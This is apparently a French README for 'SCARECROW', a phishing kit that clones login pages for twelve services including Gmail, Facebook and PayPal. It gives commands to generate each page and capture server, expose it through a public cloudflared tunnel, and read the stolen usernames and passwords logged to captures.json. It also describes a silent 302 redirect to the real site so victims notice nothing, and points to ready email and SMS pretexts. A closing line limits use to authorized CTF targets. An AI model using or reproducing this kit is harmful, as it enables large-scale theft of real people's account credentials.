# SCARECROW — L'ÉPOUVANTEUR · powered by Maxime Leal
## Kit de phishing professionnel : vraies pages de connexion, capture complète, redirection invisible

12 sites des plus grands services, chaque page clone le look exact du vrai (inline, aucune
dépendance), capture **identifiants + IP + User-Agent + heure**, puis redirige **en 302
invisible** vers le vrai site — la victime atterrit sur Gmail/Facebook/etc. et ne voit rien.

---

## TOOL 1 — LA FORGE (`trick_forge.py`)
Génère le kit d'un site (page + serveur de capture) :
```
python3 trick_forge.py gmail 8085
```
**Sites** : gmail · outlook · facebook · instagram · twitter · linkedin · netflix · paypal ·
steam · github · snapchat · tiktok
→ `sorties/trick/<site>/page.html` + `serve.py`

## TOOL 2 — LE LIEN PIÉGÉ PUBLIC (`trick_public.sh`)
```
./trick_public.sh gmail 8085
```
→ page de capture démarrée + tunnel cloudflared → **lien public** affiché
(`https://xxxx.trycloudflare.com/login`) utilisable de n'importe où.
Relance à chaque session : l'URL trycloudflare change à chaque fois.

## TOOL 3 — LE SERVEUR DE CAPTURE (`sorties/trick/<site>/serve.py`)
- GET `/login` → la page clonée
- POST `/login` → **capture JSON** : heure, IP source, User-Agent, Referer, identifiant,
  mot de passe → `captures.json` (et affichée dans la console du serveur)
- **redirection 302 immédiate** vers le vrai site : la victime croit s'être trompée de mot
  de passe ou ne remarque rien — elle est connectée sur le vrai site

## DÉMO VÉRIFIÉE EN RÉEL (sur ce banc)
- page locale : 200 ✓
- POST de test : `victime@gmail.com / MonMotDePasse123` → capture JSON ✓
- POST **via le tunnel public** : `test.public@gmail.com / TestPublic99` → capture ✓
- redirection 302 vers mail.google.com ✓

## USAGE LAB
```
cd ~/Desktop/tool_DC/ScarecrowPhish
./trick_public.sh facebook 8085      # lien public -> donner à la cible de ton CTF
cat sorties/trick/facebook/captures.json
```
Prétextes d'emails prêts : kit Flash page PHISHING (prétextes email/SMS) — branche le lien
dans le modèle, ou utilise le tracker de clics Cyborg pour compter les ouvertures.

## LECTURE DES CAPTURES
```
python3 -c "import json; [print(e['heure'],'|',e['ip'],'|',e['identifiant'],'|',e['mot_de_passe']) \
  for e in json.load(open('sorties/trick/gmail/captures.json'))]"
```

## PÉRIMÈTRE
Cibles autorisées uniquement : ton CTF, tes machines, tes participants. La redirection
invisible fait que la victime n'est jamais bloquée — c'est ce qui rend la capture crédible
et le test réaliste.
